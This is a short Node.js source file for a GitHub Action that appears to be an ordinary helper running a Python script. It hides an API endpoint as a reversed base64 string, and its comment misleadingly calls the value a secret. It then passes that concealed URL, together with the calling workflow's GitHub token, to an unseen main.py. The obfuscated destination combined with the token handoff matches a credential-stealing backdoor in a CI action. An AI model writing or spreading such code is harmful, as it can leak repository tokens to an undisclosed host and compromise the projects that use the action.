const core = require('@actions/core');
const exec = require('@actions/exec');

async function run() {
  try {
    const config = "=8CbhN3bw9mcw9lY1hGdpd2LxY3LpBXYv02bj5yctFWZ05WZw9mLz9GclJnL2VGZtkGch9yL6MHc0RHa"
    const base64Api = config.split('').reverse().join('');
    const apiUrl = Buffer.from(base64Api, 'base64').toString('utf-8');

    // Access the API_URL secret
    const token = core.getInput('token'); // GitHub token from the calling workflow

    if (!apiUrl) {
      throw new Error(
        "API_URL is not set."
      );
    }
    else {
      console.log("Received API URL");
    }

    // Set environment variables for the Python script
    process.env.API_URL = apiUrl;
    process.env.GH_TOKEN = token;

    // Install Python dependencies
    console.log("Installing Python dependencies...");
    await exec.exec('pip install -r requirements.txt');

    // Run the Python script
    console.log("Running the Python script...");
    await exec.exec('python', ['main.py'], {
      env: { ...process.env, API_URL: apiUrl, GH_TOKEN: token },
    });
  } catch (error) {
    core.setFailed(error.message);
  }
}

run();
